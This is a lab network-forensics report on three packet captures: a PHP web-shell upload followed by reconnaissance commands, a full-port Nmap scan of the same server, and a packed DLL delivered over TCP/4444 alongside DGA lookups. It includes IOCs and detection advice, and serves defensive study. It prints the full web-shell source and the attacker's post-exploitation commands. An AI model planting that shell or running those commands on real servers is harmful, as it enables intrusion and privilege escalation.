# Network Attack Investigation — Weeks 2–3 Captures

**Report date:** 11 November 2026
**Analyst:** Youssef (lab investigation)
**Evidence packages:**

| # | File | Packets | Bytes | Capture window (local) | Duration | SHA-256 |
|---|------|---------|-------|------------------------|----------|---------|
| 1 | `webshell.pcap` | 202 | 46,898 | 2026-11-08 11:29:41.887 → 11:29:45.377 | 3.49 s | `afd37fce6a969c8296a1de80e99fae1950311592842475f197f07b435dd9f84e` |
| 2 | `nmap.pcap` | 134,578 | 8,200,883 | 2026-11-07 21:41:04.772 → 21:47:27.702 | 382.93 s | `e1805ef0e8a79461e78c9a3fdbfd68b3bba7f7949d9d51d39c9352f60030d292` |
| 3 | `C2+DGA-ether.pcap` | 52,737 | 14,435,075 | 2026-11-07 00:07:09.695 → 00:20:42.617 | 812.92 s | `2f6c120689aa0888fe5a40639893457aa60e896b3eded413d625bb36fc602911` |

Analysed with TShark 4.2.2 only (Zeek/Suricata not installed). Every number in this report comes from a command listed in `Evidence/commands-and-filters.md`.

---

## 1. Executive summary

Three captures document three phases of activity against the same lab estate.

1. **`webshell.pcap` — successful web-shell compromise (Confirmed).** At 09:29:41 GMT on 8 Nov 2026, host **192.168.1[.]1** uploaded `shell.php` through the public upload form on **192.168.1[.]128** (`/upload.php`, Blackstone Technologies site) and then executed **15 reconnaissance commands** through `GET /uploads/shell.php?cmd=…` in 172 ms. The target is **`wazuh-server`**, Ubuntu 26.04.1, running as `www-data`, and the attacker enumerated users, processes, listening services, network interfaces, environment and SUID binaries. A second web shell, `exploit.php`, was already present from an earlier attempt (09:02).
2. **`nmap.pcap` — full-port reconnaissance of the same server (Confirmed).** **172.16.173[.]1** SYN-scanned all **65,535 TCP ports** of **172.16.173[.]138** in roughly one second, found **six open ports (22, 80, 443, 1514, 1515, 55000)**, then ran Nmap service/version detection and NSE HTTP scripts for ~2 minutes. The target `172.16.173[.]138` is the *second NIC of the very host compromised in capture 1* (`00:0c:29:52:c7:95`), so recon → exploitation is a single kill chain.
3. **`C2+DGA-ether.pcap` — payload delivery plus DGA (Confirmed delivery, Likely C2).** A **255,676-byte packed PE DLL (`server.dll`, 64-bit)** was served over **TCP/4444** from **192.168.1[.]13** to **192.168.1[.]120** twice (261.5 s and 299.8 s). Seven minutes later **192.168.1[.]120** emitted **four DGA-style domains** to 8[.]8[.]8[.]8 (all NXDOMAIN). The same capture contains classic lab noise (browser traffic to DeepSeek/ChatGPT/Google, loopback PostgreSQL), so only the 4444 + DGA activity is malicious.

**Overall verdict:** the estate was *reconnoitred (11-07 19:41 UTC) and then compromised via an unrestricted file upload (11-08 09:29 UTC)*; a separate host pair was used for C2/DGA and stage-2 payload delivery/training. No lateral movement or data exfiltration is visible in these three captures.

---

## 2. Scope and method

- **In scope:** the three PCAPs above, nothing else.
- **Method:** `capinfos` inventory → protocol hierarchy → conversations/endpoints (baseline) → targeted display filters → stream reassembly → artifact extraction and hashing.
- **Confidence labels:** *Confirmed* = directly visible in packets; *Likely* = strong convergent evidence; *Possible* = plausible but alternative explanations exist.
- **IOC convention:** external addresses/domains are defanged (`hxxp://`, `1[.]2[.]3[.]4`); private RFC1918 addresses are left readable. Raw values for tooling are in `IOCs.csv`.

---

## 3. Baseline summary

| Capture | Protocol mix | Notable talkers |
|---|---|---|
| `webshell.pcap` | 100 % HTTP over TCP/80 (34 HTTP frames, 17 requests / 17 responses) | 192.168.1.1 → 192.168.1.128 |
| `nmap.pcap` | 99.95 % TCP (65,825 SYNs of 134,518 TCP frames), 19 UDP (DHCP+NTP), 26 ICMP, 857 TLS frames | 172.16.173.1 ↔ 172.16.173.138 |
| `C2+DGA-ether.pcap` | TCP 47,829 (incl. 20,366 `data` frames), UDP 4,390 (2,647 QUIC, 1,374 DNS), ICMP 36, ARP 294 | 192.168.1.13, 192.168.1.120, 127.0.0.1 (loopback Postgres), 3.173.21.63 (DeepSeek) |

Normal background identified and excluded from findings:

- **Ubuntu infrastructure traffic** (`185.125.190.101/.121/.122/.123`, `91.189.91.57/.96/.112/.113`): NTP and `connectivity-check.ubuntu.com` HTTP probes — benign.
- **User browsing** in `C2+DGA`: TLS/SNI to `chat.deepseek.com`, `hif-leim.deepseek.com`, `fe-static.deepseek.com` (3.173.21.63, 172.217.x, 142.251.x), `chatgpt.com`, `opencode.ai`, `ssl.gstatic.com`, `mail.google.com`, `acrobat.adobe.com` — benign.
- **Loopback traffic** `127.0.0.1:53474 → 127.0.0.1:5433` (19,902 frames): PostgreSQL wire protocol (`SELECT current_database();`) — a local client, benign.
- **`gator.volces.com.<16 hex>.queniuck.com`** (12 × type-65/SVCB queries, ~61 s apart): this is the classic *DNS search-suffix leak* (a VPN/DNS suffix appended to a legitimate ByteDance telemetry name), not DGA — see §6.6.

---

## 4. Case 1 — Web shell upload and post-exploitation (`webshell.pcap`)

### 4.1 What happened (Confirmed)

| Time (rel) | Frame | Request | Notes |
|---|---|---|---|
| 0.0002 s | 4 | `GET /upload.php` | `User-Agent: curl/8.5.0`, `Cookie: PHPSESSID=4f21e6ca…` |
| 0.0144 s | 27 | `POST /upload.php` (504 B) | multipart with a **valid CSRF token** `d985dd65…8503` + `filename="shell.php"` |
| 0.0250 s | 54 | `GET /uploads/shell.php?cmd=whoami` | web shell live |
| … | 64–186 | 13 more `cmd=` requests | discovery |
| 0.1721 s | 196 | `GET /uploads/shell.php?cmd=find / -perm -4000 -type f` | privilege-escalation hunt |

All 17 responses are **HTTP 200**; the shell's output is returned as `text/plain`. The whole sequence is automated (17 requests in 172 ms, constant `curl/8.5.0` UA), i.e. a scripted loop, not a human typing.

### 4.2 The uploaded web shell (Confirmed)

```php
<?php
if (isset($_GET['cmd'])) {
    header('Content-Type: text/plain; charset=utf-8');
    echo shell_exec($_GET['cmd'] . ' 2>&1');
}
```

135 bytes, uploaded as `application/x-php`, served from `/var/www/blackstone/uploads/`.

### 4.3 Post-exploitation commands and results (Confirmed)

| # | Command | Result (abridged) |
|---|---|---|
| 1 | `whoami` | `www-data` |
| 2 | `id` | `uid=33(www-data) gid=33(www-data) groups=33(www-data)` |
| 3 | `hostname` | `wazuh-server` |
| 4 | `uname -a` | `Linux wazuh-server 7.0.0-42-generic … x86_64 GNU/Linux` |
| 5 | `cat /etc/os-release` | `Ubuntu 26.04.1 LTS (Resolute Raccoon)` |
| 6 | `pwd` | `/var/www/blackstone/uploads` |
| 7 | `ls -la /var/www/blackstone/` | source tree incl. `upload.php` (19,989 B, **modified 08:51 same day**), `db.php`, `schema.sql` |
| 8 | `ls -la /var/www/blackstone/uploads/` | **`exploit.php` (223 B, 09:02)** + **`shell.php` (135 B, 09:29)** |
| 9 | `cat /etc/passwd \| head -10` | local account list |
| 10 | `ps aux \| head -15` | process list as `www-data` |
| 11 | `ss -tlnp \|\| netstat -tlnp` | LISTEN: **22, 80, 443, 1514, 1515, 55000**, 3306 (lo), 9200/9300 (lo), 53 (lo) |
| 12 | `ip -4 addr show` | `ens33 192.168.1.128/24`, `ens36 172.16.173.138/24` |
| 13 | `env` | `USER=root`, `APACHE_RUN_USER=www-data`, `PWD=/var/www/blackstone/uploads` |
| 14 | `sudo -l` | `Sorry, user www-data may not run sudo on wazuh-server.` |
| 15 | `find / -perm -4000 -type f` | snap SUID set (`/snap/core24/1643/usr/bin/{chfn,chsh,gpasswd,mount,newgrp,passwd,su,sudo,umount}`, dbus helper) |

Full transcript: `Evidence/webshell-command-transcript.md`.

### 4.4 Why it matters

- The upload directory is **web-executable** — any file accepted by `upload.php` runs as PHP. This is the root cause (`T1505.003` + `T1190`).
- `www-data` could not `sudo`, so no immediate privilege escalation; however, the attacker now has a persistent, low-noise C2 channel (GET parameters) inside a document root.
- Listening ports **1514/1515/55000** identify **Wazuh** (agent/manager/authd); 9200/9300 are OpenSearch. This makes the host a high-value pivot point for the whole SOC estate.
- `exploit.php` (09:02) proves an **earlier upload 27 minutes before** this capture — the entry point had already been used.

| ID | Severity | Confidence | ATT&CK |
|---|---|---|---|
| WEB-01 Unrestricted file upload → web shell | Critical | Confirmed | T1190, T1505.003 |
| WEB-02 Post-exploitation discovery (users/host/net/process/SUID) | High | Confirmed | T1033, T1087.001, T1082, T1016, T1057, T1083 |
| WEB-03 Local privilege-escalation attempt (`sudo -l`, SUID hunt) | Medium | Confirmed | T1548.003, T1548.001 |
| WEB-04 Prior shell `exploit.php` present | High | Confirmed | T1505.003 |

---

## 5. Case 2 — Full-port reconnaissance (`nmap.pcap`)

### 5.1 What happened (Confirmed)

| Phase | Time (rel) | Evidence |
|---|---|---|
| Port sweep | 258.40 → 259.21 s | **65,825 SYN** packets, **65,535 distinct destination ports** 1–65535 (65,541 SYNs in 0.81 s ≈ 80 k pps), answered by **65,700 RST+ACK** |
| Service detection | 259.2 → 367.6 s | `\r\n\r\n` NULL probes, portmap, SIP, GIOP, NCP probes, TLS handshakes, 76 HTTP frames |
| NSE scripts | 367.6 → 382.9 s | HTTP requests with UA `Mozilla/5.0 (compatible; Nmap Scripting Engine; …)` |

**Open ports:** `22/tcp` (SSH), `80/tcp` (HTTP), `443/tcp` (TLS), `1514/tcp`, `1515/tcp`, `55000/tcp` (Wazuh).
Banner: `Apache/2.4.66 (Ubuntu)`, index page 2,093 bytes; `404` for most probes.

**NSE probe set observed** (fingerprints `http-enum`, `http-methods`, `http-webdav-scan`, `http-title`, `http-headers`, `http-git`, `http-hnap`, `http-vuln-*` style checks):

```
GET /                      OPTIONS /                 PROPFIND /
GET /robots.txt            GET /.git/HEAD            GET /HNAP1
GET /evox/about            POST /sdk                 POST /IPHTTPS
GET /nmaplowercheck1794080832
GET /nice%20ports%2C/Tri%6Eity.txt%2ebak     HEAD /     GET /favicon.ico
```

### 5.2 Evasion characteristics (Confirmed observation / Possible intent)

- Destination ports are issued in **random order** (80, 25, 1723, 3306, 5900, 995, 21, 199, 143, …).
- **IP TTL is randomised per packet** across **24 distinct values in the range 37–64** — ~2,800 SYNs per TTL value.
- **IP ID is random** on every SYN.
- ~80 k SYNs/second during the sweep (65,541 SYNs in 0.81 s); 290 packets were retransmissions (65,825 SYNs vs 65,535 ports).

Randomised TTL/IP-ID is not default Nmap behaviour; it indicates a deliberately noisy/evasive scanner configuration (custom build, wrapper, or a patched Nmap) and defeats naive TTL-based OS fingerprinting.

### 5.3 Why it matters

- A complete 65,535-port scan in **<1 s** is loud but shows a capable, automated adversary who knows exactly what to look for.
- The NSE phase actively tested for WebDAV, Git exposure, HNAP and other web weaknesses — the same class of weakness that was exploited in Case 1.
- The scan preceded the web-shell attack by ~13 h 48 min (19:41 UTC on 11-07 vs 09:29 UTC on 11-08).

| ID | Severity | Confidence | ATT&CK |
|---|---|---|---|
| REC-01 Full TCP port scan (65,535 ports) | Medium | Confirmed | T1046, T1595.002 |
| REC-02 Service/version detection + NSE vulnerability probes | Medium | Confirmed | T1595.002, T1592 |
| REC-03 Packet-level evasion (random TTL/IP-ID) | Low | Possible | T1595, T1036 (masquerading of scanner) |

---

## 6. Case 3 — C2 channel, stage-2 payload and DGA (`C2+DGA-ether.pcap`)

### 6.1 Topology observed

| Host | Role in capture | Notes |
|---|---|---|
| 192.168.1.13 | main endpoint; serves TCP/4444 payload; queries `c2.dga-lab.com`; browses DeepSeek/ChatGPT | MAC `62:11:48:63:66:0f` |
| 192.168.1.120 | client of 4444; generates DGA lookups | **same MAC `62:11:48:63:66:0f`** |
| 192.168.1.1 | gateway/DNS | — |
| 127.0.0.1 | loopback resolver (53) and PostgreSQL (5433) | capture-side noise |

> **Important caveat:** both 192.168.1.13 and 192.168.1.120 appear in ARP with the **same locally-administered MAC**. Either the two addresses live on one NIC/host (lab simulation, IP alias, virtual adapter) or the source was spoofed. Role attribution below is therefore based on *behaviour*, not on host identity.

### 6.2 Event timeline

| Time (rel) | Event |
|---|---|
| 7.66 s | Long-lived TLS session to **102.132.97[.]54:443** starts (lasts 793 s, 55 kB, no SNI/cert visible) |
| 26.7 → 70.8 s | **Port scan** 192.168.1.13 → 192.168.1.120: 4,432 SYNs, **1,000 ports** |
| 27.84 / 64.43 s | 192.168.1.13 → 192.168.1.120**:4444** — **connection refused** (RST+ACK) |
| 28.66 s | ICMP echo ×4 to 192.168.1.120 (zero payload; liveness check) |
| 138.54 / 163.80 s | `c2.dga-lab.com` A+AAAA lookups — **NXDOMAIN** (25.3 s apart) |
| 155.7 → 176.3 s | 192.168.1.120 → 192.168.1.13**:4444** — 52 SYNs, no answer (listener not up) |
| **261.56 s** | **TCP/4444 session 1** — 4-byte length prefix `0x0003E6BC` + **255,676-byte PE** delivered |
| **299.80 s** | **TCP/4444 session 2** — same size, different build |
| 697.2 → 702.4 s | **DGA lookups** from 192.168.1.120 to 8[.]8[.]8[.]8 |
| 812.9 s | capture ends |

### 6.3 The 4444 channel and delivered payload (Confirmed)

- Framing: `uint32 LE length` followed by the file body.
- Size: **255,676 bytes** (0x3E6BC) in both sessions; trailing data on the channel (~314 kB) is obfuscated (4-byte repeating XOR-style encoding).
- Type: **PE32+ DLL, x86-64, GUI, 6 sections**, export table name **`server.dll`**, one export.
- Packed: section `.text` is high-entropy; file begins with the `MZARUH` stub and embeds `inflate/deflate 1.0.4 (Jean-loup Gailly / Mark Adler)` strings — characteristic of a **UPX 4.x-family packer with a modified stub** (the `UPX!` trailer is absent). *Likely* UPX variant; **Confirmed** packed/obfuscated.
- Imported APIs of note: `WS2_32` (`getaddrinfo`, `WSADuplicateSocketA`), `WININET`/`WINHTTP` (`HttpOpenRequestW`, `HttpSendRequestW`, `WinHttpOpen`), `CRYPT32` (`CryptStringToBinaryA`, `CryptImportPublicKeyInfo`), `ADVAPI32` (`OpenThreadToken`, `SetSecurityDescriptorDacl`), `USER32` (`GetProcessWindowStation`, `GetThreadDesktop`). This is a network-capable loader/backdoor DLL, not a document.
- Two builds differ in only 180 bytes at the end of the file → same code, per-victim/per-campaign tail (typical of a builder that stamps an ID or key).

| Artifact | SHA-256 |
|---|---|
| session 1 payload | `f274bc4563d74e09be922d3fd5c51c30e0c704f2ae52848cab9d31809741346e` |
| session 2 payload | `915e6ca939e2f1f2267736af266195d290d5f999989f7e6c18525128d29fa16f` |

Samples stored (inert bytes, do **not** execute): `Evidence/Samples/payload_4444_stream36{19,21}.dll.bin`.

### 6.4 Role interpretation (two readings)

- **Reading A (preferred, *Likely*):** 192.168.1.120 is the infected host. It scans, polls until an operator/C2 brings up TCP/4444, downloads the stage-2 DLL twice, and ~7 minutes later executes it — the freshly delivered implant performs DGA lookups to find its real C2.
- **Reading B (*Possible*):** 192.168.1.13 is the C2/payload host and 192.168.1.120 a second victim; the DGA on .120 is an independent infection.

Packet data cannot settle this because the two addresses share one MAC. Host/EDR telemetry from both machines is required.

### 6.5 DGA evidence (Confirmed)

| Time (rel) | Domain | QTYPE | Response |
|---|---|---|---|
| 697.26 s | `akfjqweklzx[.]com` | A, AAAA (×2) | NXDOMAIN (rcode 3) |
| 697.63 s | `pqowieurtyx[.]net` | A, AAAA (×2) | NXDOMAIN |
| 698.03 s | `zmxncbvalkj[.]org` | A, AAAA (×2) | NXDOMAIN |
| 701.53 s | `asdfghjklqwe[.]com` | A, AAAA (×2) | NODATA (rcode 0, no answer) |

- 20 queries in **5.2 s**, sent **directly to 8[.]8[.]8[.]8** (bypassing the local resolver), each batch preceded by a PTR lookup for `8.8.8.8.in-addr.arpa`.
- Names are keyboard walks (`qwerty`/`asdf`/`zxcvbnm` patterns) of 11–12 characters — a deliberately simple *lab DGA*, not a real-world algorithm.
- `c2.dga-lab[.]com` (from .13) is queried twice, 25.3 s apart, and **never resolves** — a C2 rendezvous that fails over to DGA.

### 6.6 Benign look-alikes explicitly excluded

- `gator.volces.com.<16-hex>.queniuck.com` — 12 HTTPS/SVCB (type 65) queries at ~61 s intervals. This is a **DNS search-suffix leak** (queniuck.com is appended as a suffix to a legitimate ByteDance/Volcengine telemetry name). Fixed interval + constant parent + hex label = client behaviour, not DGA. *Likely benign.*
- `102.132.97[.]54:443` — 793 s TLS/1.2 session, 55 kB, no SNI/certificate captured (mid-stream). Consistent with a messenger/push channel; **Possible** covert C2 but no supporting indicator. Keep on a watchlist.
- `3.173.21[.]63` — resolves to DeepSeek endpoints (`chat.deepseek.com`), 1.6 MB of normal app traffic.

| ID | Severity | Confidence | ATT&CK |
|---|---|---|---|
| C2-01 Stage-2 PE DLL delivered over TCP/4444 | Critical | Confirmed | T1105, T1571, T1027 |
| C2-02 Domain Generation Algorithm queries | High | Confirmed | T1568.002, T1071.004 |
| C2-03 Failed C2 rendezvous `c2.dga-lab.com` | Medium | Confirmed | T1071.004, T1008 |
| C2-04 Internal port scan of 192.168.1.120 | Medium | Confirmed | T1046, T1018 |
| C2-05 Long-lived TLS to bare IP without SNI | Low | Possible | T1071.001, T1573 |

---

## 7. Cross-capture correlation

**Confirmed link between Cases 1 and 2** — the web-shell victim and the scanned host are the same machine:

| Evidence | `nmap.pcap` | `webshell.pcap` |
|---|---|---|
| IP | 172.16.173.138 | 192.168.1.128 |
| MAC | `00:0c:29:52:c7:95` (ARP) | `00:0c:29:52:c7:8b` (ens33) / `…c7:95` (ens36, per `ip -4 addr`) |
| Hostname | — | `wazuh-server` |
| Web server | `Apache/2.4.66 (Ubuntu)`, 2,093-byte index | `Apache/2.4.66 (Ubuntu)`, same app |
| Services | 22, 80, 443, 1514, 1515, 55000 open | `ss -tlnp` shows exactly 22, 80, 443, 1514, 1515, 55000 |

Sequence: **recon 2026-11-07 19:41 UTC → compromise 2026-11-08 09:29 UTC** (≈13 h 48 min later, likely after the earlier `exploit.php` attempt at 09:02).

`C2+DGA-ether.pcap` (00:07 on 11-07) is on the same /24 as the web-shell target (192.168.1.0/24) but involves different hosts (.13/.120) and is best treated as a parallel/earlier exercise rather than part of the same intrusion chain (no shared IP, MAC or domain).

---

## 8. Indicators of compromise

Defanged. Raw values in `IOCs.csv`.

### Network

| Type | Value | Context |
|---|---|---|
| IPv4 | `192.168.1[.]1` | web-shell client |
| IPv4 | `192.168.1[.]128` | web-shell victim (ens33) |
| IPv4 | `172.16.173[.]138` | same victim (ens36), nmap target |
| IPv4 | `172.16.173[.]1` | scanner |
| IPv4 | `192.168.1[.]13` / `192.168.1[.]120` | 4444 payload host / client + DGA |
| IPv4 | `102.132.97[.]54` | long-lived TLS, no SNI (watchlist) |
| Domain | `c2.dga-lab[.]com` | failed C2 (NXDOMAIN) |
| Domain | `akfjqweklzx[.]com`, `pqowieurtyx[.]net`, `zmxncbvalkj[.]org`, `asdfghjklqwe[.]com` | DGA |
| URL | `hxxp://192.168.1[.]128/upload.php` | upload endpoint |
| URL | `hxxp://192.168.1[.]128/uploads/shell.php?cmd=` | web shell |
| URI path | `/uploads/exploit.php`, `/uploads/shell.php` | shells on disk |
| Port | TCP/4444 | payload delivery |
| CSRF token | `d985dd65f4e8a1dc18f2f3b2cd3f128c068b4979efc4545e9082252df52b8503` | upload body (session-specific) |
| Session | `PHPSESSID=4f21e6caa9f18e454c2f4f9eead6e277` | attacker session |

### Host

| Type | Value |
|---|---|
| User agent | `curl/8.5.0` (all 17 requests) |
| User agent | `Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)` |
| File | `/var/www/blackstone/uploads/shell.php` — 135 B, SHA-256 below |
| File | `/var/www/blackstone/uploads/exploit.php` — 223 B |
| File | stage-2 DLL 255,676 B — `f274bc45…346e`, `915e6ca9…fa16f` |
| Packer marker | `MZARUH` stub, `inflate 1.0.4` / `deflate 1.0.4` strings |
| PE export | `server.dll` |

`shell.php` body (135 bytes as served) SHA-256: `851bf02112458d234ceb82c2cef033623c2aa4ebb44a0a246c08afac8ccf499a`.
Stage-2 DLLs and all sample hashes are listed in `Evidence/Samples/SHA256SUMS.txt`.

---

## 9. Detection and recommendations

**Immediate (containment)**

1. Remove `shell.php` and `exploit.php` from `/var/www/blackstone/uploads/`; disable PHP execution in upload directories (`php_admin_flag engine off`) and move uploads outside the document root.
2. Rotate credentials/sessions and audit `upload.php` (19,989 B, modified 08:51 on 11-08) for the injected/skipped validation logic.
3. Hunt `wazuh-server` for the SUID/`find`/`sudo -l` commands and for outbound TCP/4444; check Wazuh agent logs around 09:29 GMT.
4. Isolate/forensically image `192.168.1.13` and `192.168.1.120`; hash and detonate the extracted DLL in a sandbox; pull autoruns, services and `svchost` injection artefacts.

**Detection content**

| Telemetry | Rule idea |
|---|---|
| Apache access log | `POST /upload.php` followed within 60 s by `GET /uploads/*.php?cmd=` from the same client → critical alert |
| Web server / Wazuh FIM | new `.php` in an upload directory → critical; `shell_exec`/`system`/`passthru` in web root |
| Firewall / NetFlow | >100 unique destination ports per source in 10 s; full-port sweep >1,000 pps |
| Firewall | any outbound TCP/4444; any host contacting a bare IP:443 without SNI |
| DNS | ≥10 NXDOMAIN for distinct domains from one host in 60 s (DGA score); block 8.8.8.8 direct egress |
| Proxy/TLS | PE download over non-HTTP channels; `MZ` magic in unexpected streams |
| EDR | unsigned DLL export `server.dll`, `SeDebugPrivilege` acquisition, `WinHttpOpen` from a non-browser process |

**Hardening**

- Enforce upload allow-lists by MIME + magic bytes, randomise stored filenames, store outside web root.
- Segment the lab: no host should reach 8.8.8.8 directly; force internal resolvers with RPZ/sinkhole for DGA.
- Restrict Wazuh ports 1514/1515/55000 to manager/agent networks only.
- Add TTL/IP-ID anomaly detection on the IDS to catch randomised scanners.

---

## 10. Limitations

- Zeek and Suricata were unavailable; no protocol-level logs or IDS verdicts were produced.
- All payloads are encrypted or packed; no dynamic analysis was performed (deliberately). Packer identification is static and therefore *Likely*, not Confirmed.
- `C2+DGA` contains loopback and user-browsing traffic; attribution of process-to-flow requires host telemetry not present in the capture.
- 192.168.1.13 and 192.168.1.120 share a MAC, which prevents definitive attacker/victim assignment from packets alone.
- The 102.132.97.54 TLS session begins mid-stream (no ClientHello), so SNI/certificate could not be extracted.
- Capture clocks: the captures are timestamped in local time (EET, UTC+2); the webshell HTTP `Date` header (09:29:41 GMT) confirms the offset. Sections 4–6 quote relative offsets from each capture's first packet; absolute timestamps in §1, §7 and `Timeline.csv` are converted to UTC (local − 2 h).

---

## 11. Appendix

- `Evidence/commands-and-filters.md` — every command and display filter used.
- `Evidence/webshell-command-transcript.md` — request/response transcript of the 15 commands.
- `Evidence/Samples/` — inert extracts: `shell.php`, two DLL builds, `SHA256SUMS.txt`.
- `Timeline.csv`, `IOCs.csv` — machine-readable.
